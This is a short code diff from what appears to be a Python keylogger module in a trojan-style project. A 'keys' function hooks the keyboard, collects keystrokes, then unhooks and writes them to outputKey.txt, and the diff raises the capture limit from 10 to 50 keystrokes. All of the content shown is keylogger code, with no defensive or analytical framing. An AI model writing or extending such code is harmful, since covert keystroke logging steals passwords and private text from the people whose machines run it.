@@ -18,7 +18,7 @@ def run(**args):
 def keys(**args):
     key_list = []
     def onkey(event):
-        if(len(key_list) == 10):
+        if(len(key_list) == 50):
             hm.UnhookKeyboard()
             fo = open("outputKey.txt", "w")
             fo.write(str(key_list))
